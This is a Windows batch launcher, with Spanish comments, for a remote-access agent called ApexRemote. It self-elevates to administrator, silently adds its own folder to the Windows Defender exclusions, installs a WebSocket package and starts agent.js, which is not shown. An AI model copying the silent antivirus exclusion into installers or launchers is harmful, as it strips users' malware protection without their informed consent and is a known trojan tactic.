@echo off
chcp 65001 >nul
title ApexRemote

:: ── Verificar si tenemos privilegios de administrador ─────────────────────────
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Solicitando permisos de administrador...
    powershell -Command "Start-Process '%~f0' -Verb RunAs -WorkingDirectory '%~dp0'"
    exit
)

:: ── Agregar exclusión en Windows Defender ─────────────────────────────────────
echo Configurando Windows Defender...
powershell -Command "Add-MpPreference -ExclusionPath '%~dp0' -ErrorAction SilentlyContinue" >nul 2>&1

:: ── Verificar que Node.js esté instalado ──────────────────────────────────────
where node >nul 2>&1
if %errorLevel% neq 0 (
    echo.
    echo  ERROR: Node.js no está instalado.
    echo  Descárgalo de: https://nodejs.org  ^(versión LTS^)
    echo.
    pause
    exit
)

:: ── Instalar dependencias si faltan ───────────────────────────────────────────
cd /d "%~dp0"
if not exist "node_modules\ws" (
    echo Instalando dependencias ^(solo la primera vez^)...
    npm install ws >nul 2>&1
)

:: ── Iniciar el agente ─────────────────────────────────────────────────────────
echo.
echo  ╔══════════════════════════════════════╗
echo  ║        ApexRemote Agent              ║
echo  ║                                      ║
echo  ║  Abriendo en el navegador...         ║
echo  ║  El ID y PIN aparecen ahí.           ║
echo  ╚══════════════════════════════════════╝
echo.

:: Abrir la UI local en el navegador después de 2 segundos
start /b cmd /c "timeout /t 2 /nobreak >nul && start http://127.0.0.1:9280"

node agent.js
pause